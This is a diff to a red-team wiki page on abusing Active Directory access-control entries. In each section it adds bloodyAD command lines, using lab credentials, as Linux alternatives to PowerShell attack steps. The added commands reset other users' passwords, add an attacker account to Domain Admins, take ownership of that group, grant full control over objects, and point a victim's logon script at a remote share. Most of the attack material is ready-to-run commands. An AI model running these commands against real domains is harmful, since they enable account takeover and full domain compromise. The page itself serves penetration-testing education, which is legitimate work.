@@ -36,9 +36,21 @@ We can see that indeed our user `spotless` has the `GenericAll` rights, effectiv
 
 ![](<../../.gitbook/assets/Screenshot from 2018-11-07 20-19-43.png>)
 
+Linux alternative with [bloodyAD](https://github.com/CravateRouge/bloodyAD):
+
+```csharp
+bloodyAD -u spotless -p 'totoTOTOtoto1234*' -d offense.local --host 10.100.10.5 get object delegate --attr ntSecurityDescriptor --resolve-sd
+```
+
 We can reset user's `delegate` password without knowing the current password:
 
 ![](<../../.gitbook/assets/Screenshot from 2018-11-07 20-21-30 (1).png>)
+
+Linux alternative with [bloodyAD](https://github.com/CravateRouge/bloodyAD):
+
+```csharp
+bloodyAD -u spotless -p 'totoTOTOtoto1234*' -d offense.local --host 10.100.10.5 set password delegate 'Password123!'
+```
 
 ### GenericAll on Group
 
@@ -58,6 +70,12 @@ We can see that our attacking user `spotless` has `GenericAll` rights once again
 
 ![](<../../.gitbook/assets/Screenshot from 2018-11-08 09-52-10.png>)
 
+Linux alternative with [bloodyAD](https://github.com/CravateRouge/bloodyAD):
+
+```csharp
+bloodyAD -u spotless -p 'totoTOTOtoto1234*' -d offense.local --host 10.100.10.5 get object 'Domain Admins' --resolve-sd
+```
+
 Effectively, this allows us to add ourselves (the user `spotless`) to the `Domain Admin` group:
 
 ```csharp
@@ -74,6 +92,12 @@ Add-ADGroupMember -Identity "domain admins" -Members spotless
 
 # with Powersploit
 Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
+```
+
+Linux alternative with [bloodyAD](https://github.com/CravateRouge/bloodyAD):
+
+```csharp
+bloodyAD -u spotless -p 'totoTOTOtoto1234*' -d offense.local --host 10.100.10.5 add groupMember 'Domain Admins' spotless
 ```
 
 ### GenericAll / GenericWrite / Write on Computer
@@ -94,6 +118,12 @@ net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domai
 
 ![](<../../.gitbook/assets/Screenshot from 2018-11-08 11-06-32.png>)
 
+Linux alternative with [bloodyAD](https://github.com/CravateRouge/bloodyAD):
+
+```csharp
+bloodyAD -u spotless -p 'totoTOTOtoto1234*' -d offense.local --host 10.100.10.5 add groupMember 'Domain Admins' spotless
+```
+
 ### Self (Self-Membership) on Group
 
 Another privilege that enables the attacker adding themselves to a group:
@@ -105,6 +135,12 @@ net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domai
 ```
 
 ![](<../../.gitbook/assets/Screenshot from 2018-11-08 11-25-23.png>)
+
+Linux alternative with [bloodyAD](https://github.com/CravateRouge/bloodyAD):
+
+```csharp
+bloodyAD -u spotless -p 'totoTOTOtoto1234*' -d offense.local --host 10.100.10.5 add groupMember 'Domain Admins' spotless
+```
 
 ### WriteProperty (Self-Membership)
 
@@ -121,6 +157,12 @@ net group "domain admins" spotless /add /domain
 ```
 
 ![](<../../.gitbook/assets/Screenshot from 2018-11-08 15-22-50.png>)
+
+Linux alternative with [bloodyAD](https://github.com/CravateRouge/bloodyAD):
+
+```csharp
+bloodyAD -u spotless -p 'totoTOTOtoto1234*' -d offense.local --host 10.100.10.5 add groupMember 'Domain Admins' spotless
+```
 
 ### **ForceChangePassword**
 
@@ -157,6 +199,12 @@ Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureStri
 
 ![](<../../.gitbook/assets/Screenshot from 2018-11-08 12-58-25.png>)
 
+Linux alternative with [bloodyAD](https://github.com/CravateRouge/bloodyAD):
+
+```csharp
+bloodyAD -u spotless -p 'totoTOTOtoto1234*' -d offense.local --host 10.100.10.5 set password delegate 123456
+```
+
 ### WriteOwner on Group
 
 Note how before the attack the owner of `Domain Admins` is `Domain Admins`:
@@ -179,6 +227,12 @@ Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -Ow
 
 ![](<../../.gitbook/assets/Screenshot from 2018-11-08 16-54-59.png>)
 
+Linux alternative with [bloodyAD](https://github.com/CravateRouge/bloodyAD):
+
+```csharp
+bloodyAD -u spotless -p 'totoTOTOtoto1234*' -d offense.local --host 10.100.10.5 set owner 'Domain Admins' spotless
+```
+
 ### GenericWrite on User
 
 ```csharp
@@ -196,6 +250,12 @@ Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\
 Below shows the user's ~~`delegate`~~ logon script field got updated in the AD:
 
 ![](<../../.gitbook/assets/Screenshot from 2018-11-08 19-13-45.png>)
+
+Linux alternative with [bloodyAD](https://github.com/CravateRouge/bloodyAD):
+
+```csharp
+bloodyAD -u spotless -p 'totoTOTOtoto1234*' -d offense.local --host 10.100.10.5 set object delegate scriptpath -v '\\10.0.0.5\totallyLegitScript.ps1'
+```
 
 ### WriteDACL + WriteOwner
 
@@ -215,6 +275,12 @@ And you have a `WriteDACL` on that AD object:
 
 ![](<../../.gitbook/assets/Screenshot from 2018-11-10 19-07-16.png>)
 
+Linux alternative with [bloodyAD](https://github.com/CravateRouge/bloodyAD):
+
+```csharp
+bloodyAD -u spotless -p 'totoTOTOtoto1234*' -d offense.local --host 10.100.10.5 get object test --attr ntsecuritydescriptor --resolve-sd
+```
+
 ...you can give yourself [`GenericAll`](abusing-active-directory-acls-aces.md#genericall-on-group) privileges with a sprinkle of ADSI sorcery:
 
 ```csharp
@@ -223,6 +289,12 @@ $IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")
 $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
 $ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
 $ADSI.psbase.commitchanges()
+```
+
+Linux alternative with [bloodyAD](https://github.com/CravateRouge/bloodyAD):
+
+```csharp
+bloodyAD -u spotless -p 'totoTOTOtoto1234*' -d offense.local --host 10.100.10.5 add genericAll object test spotless
 ```
 
 Which means you now fully control the AD object:
